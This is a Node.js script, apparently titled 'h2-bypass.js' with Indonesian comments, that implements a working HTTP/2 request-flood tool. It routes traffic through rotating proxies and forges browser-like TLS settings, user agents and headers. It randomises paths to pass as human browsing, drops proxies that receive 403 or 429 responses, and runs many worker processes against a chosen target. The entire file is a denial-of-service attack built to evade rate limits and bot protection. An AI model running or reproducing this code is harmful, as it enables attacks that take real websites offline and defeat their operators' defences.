const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const crypto = require('crypto');
const { performance } = require('perf_hooks');

// Global Guard: Mencegah crash akibat error jaringan
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const debugMode = process.argv.includes('--debug');

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.log("Usage: node h2-bypass.js <GET/POST> <target> <time> <threads> <rate> <proxy> --debug");
    process.exit(1);
}

const url = new URL(target);
let proxyList = fs.readFileSync(proxyfile, 'utf8').split('\n').filter(x => x.length > 5);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

let statuses = {};
let badProxies = new Set();

function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

// FIX: Fitur Random Path Exploration untuk mensimulasikan navigasi manusia
function getRandomPath() {
    const commonPaths = [
        url.pathname,
        '/login',
        '/register',
        '/products',
        '/about',
        '/contact',
        '/api/v1/status',
        '/search?q=' + crypto.randomBytes(3).toString('hex'),
        '/assets/main.css',
        '/favicon.ico'
    ];
    // 70% ke path target asli, 30% menjelajah path lain
    return Math.random() < 0.7 ? url.pathname : commonPaths[Math.floor(Math.random() * commonPaths.length)];
}

function getValidProxy() {
    let available = proxyList.filter(p => !badProxies.has(p));
    if (available.length < 5) { badProxies.clear(); available = proxyList; }
    return available[Math.floor(Math.random() * available.length)];
}

function getCiphers() {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384'
    ];
    return ciphers.sort(() => Math.random() - 0.5).join(':');
}

function generateUserAgent() {
    const v = getRandomInt(122, 126);
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function go() {
    const pData = getValidProxy();
    if (!pData) return;
    const [proxyHost, proxyPort] = pData.trim().split(':');

    const netSocket = net.connect(Number(proxyPort), proxyHost);
    netSocket.setKeepAlive(true, 60000);

    netSocket.once('connect', () => {
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

        netSocket.once('data', (res) => {
            if (!res.toString().includes('200')) {
                badProxies.add(pData);
                netSocket.destroy();
                return;
            }

            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: getCiphers(),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                rejectUnauthorized: false,
            }, () => {
                let streamId = 1;
                let hpack = new HPACK();

                tlsSocket.write(PREFACE);
                const settings = Buffer.alloc(12);
                settings.writeUInt16BE(0x1, 0); settings.writeUInt32BE(65536, 2);
                settings.writeUInt16BE(0x4, 6); settings.writeUInt32BE(6291456, 8);
                tlsSocket.write(encodeFrame(0, 4, settings));
                
                tlsSocket.on('data', (chunk) => {
                    let cursor = 0;
                    while (cursor + 9 <= chunk.length) {
                        const len = chunk.readUInt32BE(cursor) >> 8;
                        const type = chunk[cursor + 3];
                        if (type === 1) { // HEADERS Frame
                            try {
                                const headers = hpack.decode(chunk.slice(cursor + 9, cursor + 9 + len));
                                const status = headers.find(h => h[0] === ':status');
                                if (status) {
                                    const code = status[1];
                                    statuses[code] = (statuses[code] || 0) + 1;
                                    if (code === '403' || code === '429') badProxies.add(pData);
                                }
                            } catch (e) {}
                        }
                        cursor += 9 + len;
                    }
                });

                const doWrite = () => {
                    if (tlsSocket.destroyed) return;

                    for (let i = 0; i < ratelimit; i++) {
                        const pseudo = [
                            [":method", reqmethod],
                            [":authority", url.hostname],
                            [":scheme", "https"],
                            [":path", getRandomPath()] // Menggunakan Random Path
                        ];

                        const headers = [
                            ["user-agent", generateUserAgent()],
                            ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"],
                            ["sec-ch-ua-platform", '"Windows"'],
                            ["sec-fetch-dest", "document"],
                            ["sec-fetch-mode", "navigate"],
                            ["sec-fetch-site", "none"],
                            ["upgrade-insecure-requests", "1"]
                        ];

                        const packed = hpack.encode(pseudo.concat(headers));
                        tlsSocket.write(encodeFrame(streamId, 1, packed, 0x5));
                        streamId += 2;
                        if (streamId > 0x7FFFFFFF) { tlsSocket.destroy(); return; }
                    }
                    setTimeout(doWrite, 1000);
                };
                doWrite();
            });

            tlsSocket.on('error', () => { badProxies.add(pData); tlsSocket.destroy(); });
        });
    });
}

if (cluster.isMaster) {
    console.clear();
    console.log(`[SYSTEM] H2-Random-Path & AutoRotator Aktif`);
    console.log(`[TARGET] ${target}`);
    for (let i = 0; i < threads; i++) cluster.fork();
    if (debugMode) {
        setInterval(() => {
            console.log(`[${new Date().toLocaleTimeString()}] Active Proxies: ${proxyList.length - badProxies.size} | Status Logs:`, statuses);
        }, 2000);
    }
    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(go, 500);
}